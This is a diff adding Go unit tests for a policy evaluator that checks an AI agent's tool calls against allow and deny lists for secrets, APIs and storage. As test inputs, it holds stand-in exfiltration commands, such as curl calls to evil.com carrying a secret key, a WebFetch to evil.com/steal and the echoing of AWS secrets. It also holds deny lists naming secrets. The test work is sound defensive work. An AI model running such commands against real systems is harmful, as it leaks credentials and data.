@@ -1944,3 +1944,265 @@ func TestSecurity_R3_128_RequireApprovalRegexSubstring(t *testing.T) {
 			"(reason: %s). This creates unnecessary approval prompts for benign commands.", reason)
 	}
 }
+
+// ---------------------------------------------------------------------------
+// EvaluateGrants
+// ---------------------------------------------------------------------------
+
+func TestEvaluateGrants_NilGrants(t *testing.T) {
+	pol := &aflock.Policy{}
+	e := NewEvaluator(pol, "")
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $AWS_SECRET_KEY"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("nil Grants should allow everything, got %s: %s", decision, reason)
+	}
+}
+
+func TestEvaluateGrants_SecretsDeny(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Secrets: &aflock.AllowDenyPolicy{
+				Deny: []string{"AWS_SECRET_KEY", "DB_PASSWORD"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Should deny: command references denied secret
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $AWS_SECRET_KEY"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for AWS_SECRET_KEY reference, got %s", decision)
+	}
+	if !strings.Contains(reason, "secret") {
+		t.Errorf("reason should mention 'secret', got: %s", reason)
+	}
+
+	// Should allow: no denied secret pattern
+	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $HOME"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for $HOME reference, got %s", decision)
+	}
+}
+
+func TestEvaluateGrants_APIsDeny(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			APIs: &aflock.AllowDenyPolicy{
+				Deny: []string{"evil.com", "malware.io"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Should deny: command references denied API
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl https://evil.com/data"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for evil.com, got %s", decision)
+	}
+	if !strings.Contains(reason, "API") {
+		t.Errorf("reason should mention 'API', got: %s", reason)
+	}
+
+	// Should allow: no denied API pattern
+	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl https://safe.com/data"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for safe.com, got %s", decision)
+	}
+}
+
+func TestEvaluateGrants_StorageDeny(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Storage: &aflock.AllowDenyPolicy{
+				Deny: []string{"s3://secret-bucket", "gs://private-data"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Should deny: command references denied storage
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://secret-bucket/file ."}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for s3://secret-bucket, got %s", decision)
+	}
+	if !strings.Contains(reason, "storage") {
+		t.Errorf("reason should mention 'storage', got: %s", reason)
+	}
+
+	// Should allow: no denied storage pattern
+	decision, _ = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://public-bucket/file ."}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for s3://public-bucket, got %s", decision)
+	}
+}
+
+func TestEvaluateGrants_SecretsAllow(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Secrets: &aflock.AllowDenyPolicy{
+				Allow: []string{"ALLOWED_VAR", "SAFE_TOKEN"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Should allow: input contains an allowed pattern
+	decision, _ := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $ALLOWED_VAR"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for ALLOWED_VAR, got %s", decision)
+	}
+
+	// Should deny: input does not contain any allowed pattern
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "echo $OTHER_VAR"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny when no allow pattern matches, got %s", decision)
+	}
+	if !strings.Contains(reason, "does not match any allowed secret") {
+		t.Errorf("reason should mention 'does not match any allowed secret', got: %s", reason)
+	}
+}
+
+func TestEvaluateGrants_MultipleCategoriesDeny(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Secrets: &aflock.AllowDenyPolicy{
+				Deny: []string{"SECRET_KEY"},
+			},
+			APIs: &aflock.AllowDenyPolicy{
+				Deny: []string{"evil.com"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Secrets check fires first
+	decision, reason := e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl evil.com -H SECRET_KEY"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny, got %s", decision)
+	}
+	if !strings.Contains(reason, "secret") {
+		t.Errorf("secrets deny should fire first, got: %s", reason)
+	}
+
+	// Only API pattern matches
+	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "curl evil.com"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny, got %s", decision)
+	}
+	if !strings.Contains(reason, "API") {
+		t.Errorf("API deny should fire, got: %s", reason)
+	}
+}
+
+func TestEvaluateGrants_NonBashTool(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			APIs: &aflock.AllowDenyPolicy{
+				Deny: []string{"evil.com"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Should deny: WebFetch URL contains denied API pattern
+	decision, _ := e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://evil.com/api"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for WebFetch to evil.com, got %s", decision)
+	}
+
+	// Should allow: safe URL
+	decision, _ = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://safe.com/api"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for WebFetch to safe.com, got %s", decision)
+	}
+}
+
+func TestEvaluateGrants_AllowGlobPatterns(t *testing.T) {
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Secrets: &aflock.AllowDenyPolicy{
+				Allow: []string{"vault:secret/data/readonly/*"},
+				Deny:  []string{"vault:secret/data/production/*"},
+			},
+			APIs: &aflock.AllowDenyPolicy{
+				Allow: []string{"https://api.anthropic.com/*", "https://csrc.nist.gov/*"},
+			},
+			Storage: &aflock.AllowDenyPolicy{
+				Allow: []string{"s3://attestations/*"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// Secrets: allowed path
+	decision, reason := e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/readonly/mykey"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for vault readonly, got %s: %s", decision, reason)
+	}
+
+	// Secrets: denied path
+	decision, reason = e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/production/dbpass"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for vault production, got %s", decision)
+	}
+	if !strings.Contains(reason, "denied") {
+		t.Errorf("expected deny reason to mention 'denied', got: %s", reason)
+	}
+
+	// APIs: allowed URL
+	decision, reason = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://api.anthropic.com/v1/messages"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for anthropic API, got %s: %s", decision, reason)
+	}
+
+	// APIs: denied URL
+	decision, reason = e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://evil.com/steal"}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for evil.com, got %s: %s", decision, reason)
+	}
+
+	// Storage: allowed path
+	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://attestations/run-1/output.json ."}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("expected allow for s3://attestations, got %s: %s", decision, reason)
+	}
+
+	// Storage: denied path
+	decision, reason = e.EvaluateGrants("Bash", json.RawMessage(`{"command": "aws s3 cp s3://private-bucket/secrets ."}`))
+	if decision != aflock.DecisionDeny {
+		t.Errorf("expected deny for s3://private-bucket, got %s: %s", decision, reason)
+	}
+}
+
+func TestEvaluateGrants_CrossCategoryNoBleed(t *testing.T) {
+	// Regression test: secrets allow-list should NOT block WebFetch URLs
+	pol := &aflock.Policy{
+		Grants: &aflock.GrantsPolicy{
+			Secrets: &aflock.AllowDenyPolicy{
+				Allow: []string{"vault:secret/data/readonly/*"},
+			},
+			APIs: &aflock.AllowDenyPolicy{
+				Allow: []string{"https://api.anthropic.com/*"},
+			},
+		},
+	}
+	e := NewEvaluator(pol, "")
+
+	// WebFetch should NOT be blocked by the secrets category
+	decision, reason := e.EvaluateGrants("WebFetch", json.RawMessage(`{"url": "https://api.anthropic.com/v1/messages"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("secrets allow-list should not block WebFetch, got %s: %s", decision, reason)
+	}
+
+	// Vault read should NOT be blocked by the APIs category
+	decision, reason = e.EvaluateGrants("mcp__vault__read", json.RawMessage(`{"path": "vault:secret/data/readonly/key"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("APIs allow-list should not block vault read, got %s: %s", decision, reason)
+	}
+
+	// Something that matches neither category should be allowed (no relevant category)
+	decision, reason = e.EvaluateGrants("Read", json.RawMessage(`{"file_path": "src/main.go"}`))
+	if decision != aflock.DecisionAllow {
+		t.Errorf("unrelated tool should be allowed when no category matches, got %s: %s", decision, reason)
+	}
+}
